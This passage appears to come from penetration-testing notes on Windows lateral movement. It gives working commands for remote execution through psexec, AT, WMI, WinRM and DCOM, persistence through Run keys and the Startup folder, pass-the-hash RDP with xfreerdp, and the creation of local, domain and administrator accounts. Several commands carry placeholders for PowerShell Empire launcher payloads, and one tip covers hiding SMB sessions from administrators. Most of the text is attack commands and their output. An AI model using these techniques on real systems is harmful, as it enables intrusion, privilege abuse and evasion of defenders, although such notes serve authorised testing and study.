Microsoft Sysinternal tool psexec can be downloaded from `PsExec <https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx>`_. Mark has written a good article on how psexec works is `PsExec Working <http://windowsitpro.com/systems-management/psexec>`_.

::

 psexec.exe \\Computername -u DomainName\username -p password <command>
 command can be cmd.exe/ ipconfig etc.

Task Scheduler
^^^^^^^^^^^^^^
If you are the administrator of the remote machine and using runas /netonly, we can utilize AT to run commands remotely. Using AT, a command to be run at designated time(s) as SYSTEM.

Example:

::

 AT \\REMOTECOMPUTERNAME 12:34 "command to run"

::

 AT \\REMOTECOMPUTERNAME 12:34 cmd.exe \c "command to run"
 
 "command to run" can be web-delivery string or powershell empire string.

If we need to delete the AT jobs, we can use

::

 AT \\REMOTECOMPUTERNAME id /delete /yes

However, sometimes doing it remotely, we need to figure out the time of the remote computer, we can utilize NET TIME

::

 NET TIME \\REMOTECOMPUTERNAME

Remote Registry
^^^^^^^^^^^^^^^^

A command to be run or DLL to be loaded when specific events occur, such as boot or login or process execution, as active user or SYSTEM.

Example:
::

 REG ADD \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t REG_SZ /d "command to run"
 
Command will run every time a user logs in as the user.

We can query the remote registry also using

::

 REG QUERY \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry

We can delete the remote registry using

::

 REG DELETE \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry


Remote File Access
^^^^^^^^^^^^^^^^^^^

We can copy a launcher.bat file with powershell empire and drop it Startup folder, so that it executes every time a user logs in as a user.

Example:

::

 xcopy executabletorun.exe "\\REMOTECOMPUTERNAME\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat"

WinRM
^^^^^

Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI, it can be thought of as an HTTP based API for WMI. WinRM will listen on one of two ports: 5985/tcp (HTTP) and 5986/tcp (HTTPS)

If one of these ports is open, WinRM is configured and you can try entering a remote session.

* Enabling PS-Remoting:
 
 Configure the remote machine to work with WinRM. We need to run the below command from elevated powershell prompt 
 ::

  PS C:\Windows\system32> Enable-PSRemoting -Force
  WinRM already is set up to receive requests on this machine.
  WinRM has been updated for remote management.
  Created a WinRM listener on HTTP://* to accept WS-Man requests to any IP on this machine.
  WinRM firewall exception enabled.

* Testing the WinRM Connection : We can use the Test-WSMan function to check if target is configured for WinRM. It should return information returned about the protocol version and wsmid

 :: 

  
  PS C:\> Test-WSMan XXXX-APPS03.example.com
  wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
  ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
  ProductVendor   : Microsoft Corporation
  ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 2.0

* Execute commands using PowerShell Invoke-Command on the target over WinRM. 

 :: 

  PS C:\> Invoke-Command -ComputerName XXXX-APPS03.xxx.example.com -ScriptBlock {ipconfig /all}

  Windows IP Configuration

   Host Name . . . . . . . . . . . . : XXXX-Apps03
   Primary Dns Suffix  . . . . . . . : xxx.example.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : xxx.example.com
                                       example.com

* Interactive PowerShell session:

 ::

  PS C:\> Enter-PSSession -ComputerName XXXX-APPS03.xxx.example.com
  [XXXX-APPS03.xxx.example.com]: PS C:\Users\dummyuser\Documents> whoami
  example.com\dummyuser

The above commands are executed using runas /netonly if you want to run it with the credentials we can use 

:: 

 -credential domainname\username switch

Also, if you want to disable the psremoting/ WinRM, you can utilize `Disable-PSRemoting <https://msdn.microsoft.com/en-us/powershell/reference/4.0/microsoft.powershell.core/disable-psremoting>`_ . However, if you get

::

 PS C:\Windows\system32> Disable-PSRemoting
 WARNING: Disabling the session configurations does not undo all the changes made by the Enable-PSRemoting or
 Enable-PSSessionConfiguration cmdlet. You might have to manually undo the changes by following these steps.
     1. Stop and disable the WinRM service.
     2. Delete the listener that accepts requests on any IP address.
     3. Disable the firewall exceptions for WS-Management communications.
     4. Restore the value of the LocalAccountTokenFilterPolicy to 0, which restricts remote access to members of the Administrators group on the computer.

then follow the `How to revert changes made by Enable-PSRemoting? <https://blogs.technet.microsoft.com/bshukla/2011/04/27/how-to-revert-changes-made-by-enable-psremoting/>`_


WMI
^^^

As per the technet article `Windows Management Instrumentation <https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx>`_ (WMI) is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers.

* Local code execution

 WMI Process Create: The Win32_Process class can be called via WMI to query, modify, terminate, and create running processes.

 ::
  
  wmic path win32_process call create "calc.exe"
  Executing (win32_process)->create()
  Method execution successful.
  Out Paramteres:
  instance of __PARAMETERS
  {
        ProcessId = 2616;
        ReturnValue = 0;
  };

 The command returns the ProcessID and the ReturnValue (0 abcning no errors)

* Remote code execution

  We can use runas command to authenticate as a different user and then execute commands using wmic or use

  ::

   wmic /node:computername /user:domainname\username path win32_process call create "**empire launcher string here**"

   instead of computername, we can specify textfile containing computernames and specify using
   wmic /node:@textfile

 Refer Rop-Nop blog `Part3: Wmi and winrm <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/>`_

DCOM 
^^^^

The below is as per my understanding (I might be wrong), if so, please do correct me. After reading `Lateral Movement Using the MMC20.Application COM Object <https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/>`_ and `Lateral Movement Via DCOM Round 2 <https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/>`_ I believe there are three ways to do lateral movement by using DCOM

* DCOM applications via MMC Application Class (MMC20.Application) : This COM object allows you to script components of MMC snap-in operations. there is a method named “ExecuteShellCommand” under Document.ActiveView.

 ::

  PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","IPAddress"))
  PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)

  For Empire:
  $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")

 Tanoy has written a simple wrapper/ function `Invoke-MMC20RCE.ps1 <https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1>`_ which might be useful.

* DCOM via ShellExecute

 ::

  $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"IPAddress")
  $obj = [System.Activator]::CreateInstance($com)
  $item = $obj.Item()
  $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
  ^ The above should run a calc

* DCOM via ShellBrowserWindow ( Windows 10 Only, the object doesn't exists in Windows 7 )

 ::

  $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"IPAddress")
  $obj = [System.Activator]::CreateInstance($com)
  $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
  ^ The above should run a calc


All the above three method, assumes that either you are running the commands as administrator of the remote machine. And you have achieved it either by using runas /netonly or logging in as that user.


While executing the above if you get the below error, it means, we do not have access to execute object remotely which results in “Access Denied”:

::

  $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"IPAddress")
  $obj = [System.Activator]::CreateInstance($com)
  Exception calling "CreateInstance" with "1" arguement(s) "Retrieving the COM class factory for remote component with CLSID {} from machine IPAddress failed due to the following error 80070005.

  At line:1 char:1
  + $obj = [System.Activator]::CreateInstance($com)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    +CategoryInfo             : NotSpecified: (:), MethodInvocationException
    +FullyQualifiedErrorID    : UnauthorizedAccessException




xfreerdp/ Remote Desktop
^^^^^^^^^^^^^^^^^^^^^^^^

* rdesktop

 ::

  rdesktop IPAddress

* Pass the Hash with Remote Desktop: If we have a hash of a user, we can use xfreerdp to have remote desktop

 ::

  xfreerdp /u:user /d:domain /pth:hash /v:IPAddress

 More information refer `Passing the Hash with Remote Desktop <https://www.kali.org/penetration-testing/passing-hash-remote-desktop/>`_ 


 .. Todo ::

   ----dsquery !! SubMSI ? MSUtil to use RCE?
   ----Any commands if net, or powershell is blocked? or PV/ BH is caught? 


Useful Stuff:
--------------

Add/ remove/ a local user
^^^^^^^^^^^^^^^^^^^^^^^^^^

:: 

 net user /add [username] [password]

::

 net user John xxxxxxxxx /ADD

 C:\>net user /add John *
 Type a password for the user: 
 Retype the password to confirm:
 The command completed successfully.

Add a domain user
^^^^^^^^^^^^^^^^^^^^

::

 net user username password /ADD /DOMAIN

Add / remove a local user to administrator group
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

 net localgroup administrators [username] /add


Accessing Remote machines:
^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Windows 

 Setup an SMB connection with a host
 ::
 
  PS C:\> net use \\DC.xxxxxxxx.net
  The command completed successfully.

 Check for access to admin shares ("C$", or "ADMIN$"), if we are admin:

 ::

  PS C:\> dir \\DC.xxxxxxxxxx.net\C$\Users

  Directory: \\DC.xxxxxxxx.net\C$\Users 
  
 
  Mode                LastWriteTime     Length Name
  ----                -------------     ------ ----
  d----        20.11.2016     09:35            axx.xxxxxx
  d----        21.11.2010     06:47            Administrator
  d-r--        14.07.2009     06:57            Public  


 If we are not admin, we might get a access denied:

 ::

  PS C:\> dir \\DC.xxxxxxxxxx.net\C$\Users
  Access is denied.
  
 Check your net connections: 

 ::
 
  PS C:> net use
  New connections will be remembered.  
  
  Status       Local     Remote                    Network 
  
  -------------------------------------------------------------------------------
  OK                     \\DC.xxxxxxxx.net\IPC$   Microsoft Windows Network
  The command completed successfully.
 
 However, if administrator on DC.xxxxx.net runs a net session command, the connections would be detected. For that issue 
 ::
 
  net use /delete *
 
 On windows, after running this, if we execute
 
 ::
 
  //IPAddress/C$

 we should be able to view the directory via windows explorer.

* Linux

 smbclient: We can use smbclient to access the remote computer file-system.

 :: 
   
   smbclient -L hostname -U domainname\\username

   -L|--list This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.


 The below will drop you in to command line
 ::

  smbclient \\\\hostname\\C$ -U domainname\\username
  (After entering the password)
  smb: \> ls
  smb: \> ls
  $Recycle.Bin                      DHS        0  Wed Nov 30 20:00:40 2016
  .rnd                                A     1024  Mon Jul 27 13:51:24 2015
  Boot                              DHS        0  Mon Jul 27 14:16:53 2015
  bootmgr                          AHSR   333257  Sat Apr 11 21:42:12 2009
  BOOTSECT.BAK                      ASR     8192  Wed Jul 21 09:01:52 2010
  Certificate                         D        0  Sun Jun 23 17:20:48 2013
  Config.Msi                        DHS        0  Thu Feb 16 01:49:59 2017
  cpqsprt.trace                       A     8004  Wed Jul 21 08:59:57 2010
  cpqsystem                           D        0  Wed Jul 21 08:32:58 2010
  csv.err                             A       90  Sun May 20 15:35:38 2012
  csv.log                             A      278  Sun May 20 15:35:38 2012
  Documents and Settings            DHS        0  Sat Jan 19 19:53:20 2008
  Program Files                      DR        0  Thu Sep  8 16:24:36 2016
  Program Files (x86)                DR        0  Tue Nov 22 21:28:01 2016
  ProgramData                        DH        0  Thu Feb  9 16:51:52 2017
  Rename.bat                          A     1406  Wed Oct 26 15:11:19 2011
  System Volume Information         DHS        0  Thu Feb 16 01:49:56 2017
  temp                                D        0  Fri Aug  9 17:16:55 2013
  Users                              DR        0  Wed Nov 30 20:00:08 2016
  Windows                             D        0  Wed Feb 15 23:18:12 2017

